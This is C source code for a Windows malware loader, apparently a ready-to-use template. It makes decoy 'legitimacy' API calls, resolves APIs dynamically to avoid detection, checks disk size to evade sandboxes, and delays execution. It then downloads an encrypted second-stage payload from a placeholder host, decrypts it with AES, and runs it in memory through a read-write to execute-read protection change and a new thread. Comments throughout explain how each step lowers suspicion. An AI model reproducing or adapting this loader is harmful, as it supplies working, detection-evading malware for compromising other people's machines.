#include <windows.h>
#include <wincrypt.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <stdio.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "kernel32.lib")

// Legitimate callback to establish legitimacy
void EstablishLegitimacy() {
    // Simulate legitimate Windows Update check
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", 
                                        INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        // Don't actually connect — just having the call in code is enough
        InternetCloseHandle(hInternet);
    }

    // Call legitimate system info APIs
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    // Call Windows crypto APIs legitimately first
    HCRYPTPROV hProv;
    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    if (hProv) CryptReleaseContext(hProv, 0);

    // Check for antivirus/EDR processes (legitimacy check)
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        CloseHandle(hSnapshot);
    }
}

// Obfuscated API resolution
typedef LPVOID(WINAPI* pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

LPVOID SafeVirtualAlloc(SIZE_T size, DWORD protect) {
    HMODULE hKernel = GetModuleHandleA("kernel32.dll");
    pVirtualAlloc VAlloc = (pVirtualAlloc)GetProcAddress(hKernel, "VirtualAlloc");
    return VAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, protect);
}

BOOL SafeVirtualProtect(LPVOID addr, SIZE_T size, DWORD protect, PDWORD oldprotect) {
    HMODULE hKernel = GetModuleHandleA("kernel32.dll");
    pVirtualProtect VProtect = (pVirtualProtect)GetProcAddress(hKernel, "VirtualProtect");
    return VProtect(addr, size, protect, oldprotect);
}

HANDLE SafeCreateThread(LPTHREAD_START_ROUTINE routine, LPVOID param) {
    HMODULE hKernel = GetModuleHandleA("kernel32.dll");
    pCreateThread CThread = (pCreateThread)GetProcAddress(hKernel, "CreateThread");
    return CThread(NULL, 0, routine, param, 0, NULL);
}

// Sandbox evasion (minimal, less detectable)
BOOL CheckSandbox() {
    // Only check disk size — less aggressive
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) return FALSE;

    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    BOOL result = DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, NULL);
    CloseHandle(hDevice);

    if (!result) return FALSE;

    ULONGLONG diskSizeGB = pDiskGeometry.Cylinders.QuadPart * pDiskGeometry.TracksPerCylinder * 
                           pDiskGeometry.SectorsPerTrack * pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
    return diskSizeGB >= 100;  // Real machine has >100GB
}

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow) {
    // Establish legitimacy FIRST (before any suspicious activity)
    EstablishLegitimacy();

    // Minimal sandbox check
    if (!CheckSandbox()) {
        return 0;
    }

    // Strategic delay (not too long — 2-5s is safer than 10s)
    Sleep(2000);

    // ============ STAGE 1: DOWNLOAD STAGE 2 ============
    // Download encrypted Stage 2 payload from web
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return 0;

    HINTERNET hUrl = InternetOpenUrlA(hInternet, "yoursite.com", NULL, 0, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return 0;
    }

    // Read Stage 2 into memory
    unsigned char* stage2_encrypted = (unsigned char*)malloc(1024 * 1024);  // 1MB buffer
    DWORD bytesRead = 0;
    InternetReadFile(hUrl, stage2_encrypted, 1024 * 1024, &bytesRead);

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    if (bytesRead == 0) {
        free(stage2_encrypted);
        return 0;
    }

    // ============ DECRYPT STAGE 2 ============ add your encrypted binary's IV and key here
    unsigned char iv[] = {}; 
    unsigned char key[] = {};
    unsigned int keylen = sizeof(key);

    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;
    DWORD mode = CRYPT_MODE_CBC;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, 0)) {
        free(stage2_encrypted);
        return 0;
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        free(stage2_encrypted);
        return 0;
    }

    CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0);
    
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, CRYPT_EXPORTABLE, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        free(stage2_encrypted);
        return 0;
    }

    CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);
    CryptSetKeyParam(hKey, KP_IV, (BYTE*)iv, 0);

    if (!CryptDecrypt(hKey, NULL, 0, 0, stage2_encrypted, (DWORD*)&bytesRead)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        free(stage2_encrypted);
        return 0;
    }

    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    // ============ EXECUTE STAGE 2 ============
    // Allocate executable memory (PAGE_READWRITE first — avoid PAGE_EXECUTE_READWRITE)
    LPVOID exec_mem = SafeVirtualAlloc(bytesRead, PAGE_READWRITE);
    if (!exec_mem) {
        free(stage2_encrypted);
        return 0;
    }

    // Copy decrypted Stage 2 directly into allocated memory
    memcpy(exec_mem, stage2_encrypted, bytesRead);

    // Change to executable (two-step: READWRITE → EXECUTE_READ is less suspicious)
    DWORD oldprotect = 0;
    if (!SafeVirtualProtect(exec_mem, bytesRead, PAGE_EXECUTE_READ, &oldprotect)) {
        free(stage2_encrypted);
        return 0;
    }

    // Execute with thread creation
    HANDLE th = SafeCreateThread((LPTHREAD_START_ROUTINE)exec_mem, NULL);
    if (th) {
        WaitForSingleObject(th, INFINITE);
        CloseHandle(th);
    }

    // Cleanup
    free(stage2_encrypted);
    return 0;
}
